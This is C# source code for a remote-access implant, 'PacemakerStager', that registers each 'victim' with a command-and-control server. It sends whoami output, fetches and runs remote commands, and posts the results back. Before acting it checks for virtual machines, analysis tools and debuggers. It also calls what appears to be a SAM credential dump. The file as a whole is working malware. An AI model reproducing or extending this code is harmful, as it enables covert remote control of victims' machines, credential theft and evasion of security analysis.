using System;
using System.IO;
using System.Linq;
using System.Text;
using Newtonsoft.Json;
using System.Net.Http;
using System.Threading;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Runtime.Serialization.Formatters.Binary;
using System.Net;
using System.Globalization;

namespace PacemakerStager
{
    public class InitialHandshakeJson
    {
        public string victimName { get; set; }
        public string victimAdditionalinfo { get; set; }
    }

    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static string server_hostname = "http://localhost:3000";
        public static BinaryFormatter MainBinaryFormatter;
        public static AuthCore authObj;
        static Stream file_stream;

        public async static Task InitialHandshake()
        {
            HttpClient Client = new HttpClient();

            InitialHandshakeJson initialHandshakejson = new InitialHandshakeJson
            {
                victimName = GetInitialUserInformation("name"),
                victimAdditionalinfo = GetInitialUserInformation("description")
            };


            string output = JsonConvert.SerializeObject(initialHandshakejson);

            var content = new StringContent(output, Encoding.UTF8, "application/json");

            var json = await Client.PutAsync(server_hostname + "/core/initialhandshake", content);

            string jsonResponse;

            if (json.IsSuccessStatusCode)
            {
                jsonResponse = await json.Content.ReadAsStringAsync();

                authObj = JsonConvert.DeserializeObject<AuthCore>(jsonResponse);

                MainBinaryFormatter = new BinaryFormatter();
                Stream stream1;
                stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
                MainBinaryFormatter.Serialize(stream1, authObj);
                stream1.Close();

            }
            else
            {
                await KillSwitch();
            }
        }

        public async static Task<CmdResult> GetAndRunCmd()
        {
         
            HttpClient Client = new HttpClient();
           
            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var response = await Client.PostAsync(server_hostname + "/core/getcmd", content);

            string jsonString = await response.Content.ReadAsStringAsync();

            Console.WriteLine(jsonString);

            Cmd cmdObj;
            CmdResult resultObj = new CmdResult();

            if (response.IsSuccessStatusCode)
            {
                cmdObj = JsonConvert.DeserializeObject<Cmd>(jsonString);

                if (cmdObj.active && cmdObj.command.Length > 0)
                {
                    string result = cmdObj.RunCmd();
                    resultObj.result = B64.b64Encode(result);
                    resultObj.username = authObj.Username;
                    resultObj.jwt_key = authObj.JwtToken;
                    resultObj.commandId = cmdObj.commandId;
                }
            }

            if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized)
            {
                Console.WriteLine("\nold jwt: " + authObj.JwtToken + "\n");
                bool status = await authObj.refresh();
                Console.WriteLine("\nnew jwt: " + authObj.JwtToken + "\n");

                if (status == false) // false means refresh has expired and needs to reauthenticate...
                {
                    await KillSwitch();
                }
                else
                {
                    MainBinaryFormatter = new BinaryFormatter();
                    Stream stream1;
                    stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
                    MainBinaryFormatter.Serialize(stream1, authObj);
                    stream1.Close();

                    resultObj = await GetAndRunCmd();

                    return resultObj;
                }

            }

            return resultObj;

            
        }


        public async static Task<bool> PostEffectiveResults(CmdResult resultJson)
        {
            HttpClient Client = new HttpClient();

            string output = JsonConvert.SerializeObject(resultJson);

            var content = new StringContent(output, Encoding.UTF8, "application/json");

            var response = await Client.PutAsync(server_hostname + "/core/postresult", content);

            string jsonString = await response.Content.ReadAsStringAsync();

            if (response.IsSuccessStatusCode)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static string GetInitialUserInformation(string option)
        {

            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;


            if (option == "name")
            {
                process.Start();
                process.StandardInput.WriteLine("whoami > result.txt");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
            }
            else
            {
                process.Start();
                process.StandardInput.WriteLine("whoami /all > result.txt");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
            }

            if (File.Exists("result.txt"))
            {

                StreamReader sr = new StreamReader(Environment.CurrentDirectory + "\\result.txt");
                // read everything from file
                string result = sr.ReadToEnd();

                sr.Close();

                return result;

            }
            else
            {
                return "result file not created !";
            }
        }


        public async static Task KillSwitch()
        {
            HttpClient Client = new HttpClient();

            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var json = await Client.PostAsync(server_hostname + "/core/killswitch", content);


            string fullPath = Environment.CurrentDirectory + "\\killed.txt";

            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                var jsonResponse = await json.Content.ReadAsStringAsync();
                writer.WriteLine(jsonResponse.ToString());
                writer.WriteLine(json.ToString());
                writer.WriteLine("\n\nVictim was killed...");
            }

            return;
        }

        public static async Task<bool> CheckForInternetConnection(int timeoutMs = 10000, string url = null)
        {
            try
            {
                url ??= CultureInfo.InstalledUICulture switch
                {
                    { Name: var n } when n.StartsWith("fa") => // Iran
                        "http://www.aparat.com",
                    { Name: var n } when n.StartsWith("zh") => // China
                        "http://www.baidu.com",
                    _ =>
                        "http://www.gstatic.com/generate_204",
                };

                var request = (HttpWebRequest)WebRequest.Create(url);
                request.KeepAlive = false;
                request.Timeout = timeoutMs;
                using (var response =  (HttpWebResponse)request.GetResponse())
                    return true;
            }
            catch
            {
                return false;
            }
        }

        static async Task Main(string[] args)
        {
            
            const int SW_HIDE = 0;
            const int SW_SHOW = 5;
            var handle = GetConsoleWindow();

            // Hide
            // ShowWindow(handle, SW_HIDE);

            bool checkInternet = await CheckForInternetConnection(10000, "https://google.com");
            int round = 1;

            while (checkInternet == false)
            {
                Thread.Sleep(10000);
                checkInternet = await CheckForInternetConnection(10000, "https://google.com");
                Console.WriteLine("Checked for internet " + round + " time" + (round == 1 ? "" : "s") + "...");
                round++;
            }

            if (Scanner.IsRunningInVM() == true)
            {
                Console.WriteLine("Nope!");
                return;
            }
            if (Scanner.ScanBadProcesses() == true)
            {
                Console.WriteLine("Nope!");
                return;
            }
            if (DbgPrt1.PerformOtherChecks() == true)
            {
                Console.WriteLine("Nope!");
                return;
            }
           
            DbgPrt2.HideOSThreads();

            if (File.Exists("authObject.dat"))
            {
                try
                {
                    BinaryFormatter MainBinaryFormatter5 = new BinaryFormatter();                           ///
                    Stream stream2;                                                        /// 
                    stream2 = File.Open("authObject.dat", FileMode.Open);
                    authObj = (AuthCore)MainBinaryFormatter5.Deserialize(stream2);                         /// 
                    stream2.Close();

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    await InitialHandshake();
                    Console.WriteLine("Finished authenticating...");
                }

            }
            else
            {
                file_stream = File.Create("authObject.dat");
                file_stream.Close();

                await InitialHandshake();

                Console.WriteLine("Finished authenticating...");
            }

            CmdResult resultObj = await GetAndRunCmd();

            if (resultObj.result == null || resultObj.result.Length < 1)
            {
                Console.WriteLine("[!] Pass...");
            }
            else
            {
                bool postStatus = await PostEffectiveResults(resultObj);

                if (postStatus == false)
                {
                    await KillSwitch();
                }
            }

            Thread.Sleep(3000);
            Console.WriteLine("Got and Ran commands...");
            MrSam.SamDmp();
            await KillSwitch();

            Console.WriteLine("Done...");
            File.Delete("result.txt");

            Console.Read();
        }
    }
}
